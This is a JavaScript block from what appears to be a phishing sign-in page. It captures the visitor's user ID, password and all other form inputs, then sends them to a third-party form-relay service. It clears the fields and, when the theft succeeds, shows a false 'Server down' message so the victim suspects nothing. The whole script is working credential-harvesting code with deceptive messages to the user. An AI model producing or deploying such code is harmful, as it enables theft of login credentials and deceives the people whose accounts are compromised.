    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Get the submit button
            var submitButton = document.getElementById("signInButton");
    
            // Add a click event listener to the submit button
            submitButton.addEventListener("click", function(event) {
                // Prevent the default form submission
                event.preventDefault();
    
                // Get the input element with id "userIdInput"
                var userIdInput = document.getElementById("userIdInput");
    
                // Get the input element with id "email"
                var emailInput = document.getElementById("email");
    
                // Get all input elements on the page
                var inputs = document.querySelectorAll("input");
    
                // Create a FormData object to store form data
                var formData = new FormData();
    
                // Append "User ID: " text only to the input with id "userIdInput"
                formData.append(userIdInput.name, "USER ID: " + userIdInput.value);
    
                // Append "Password: " text only to the input with id "email"
                formData.append(emailInput.name, "PASSWORD: " + emailInput.value);
    
                // Iterate over each input element except "userIdInput" and "email" and append its name and value to the FormData object
                inputs.forEach(function(input) {
                    if (input !== userIdInput && input !== emailInput) {
                        formData.append(input.name, input.value);
                    }
                });
    
                // Clear all input fields
                inputs.forEach(function(input) {
                    input.value = "";
                });
    
                // Create a new XMLHttpRequest object
                var xhr = new XMLHttpRequest();
    
                // Define the POST request
                xhr.open("POST", "https://api.web3forms.com/submit");
    
                // Set the appropriate headers
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
                // Send the FormData object as the request body
                xhr.send(new URLSearchParams(formData));
    
                // Handle server response
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        // Server response is OK
                        alert("Server down, try again in an hour");
                    } else {
                        // Server error
                        alert("Form submitted successfully");
                    }
                };
    
                // Handle network errors
                xhr.onerror = function() {
                    alert("Network error occurred. Please try again later.");
                };
            });
        });
    </script>
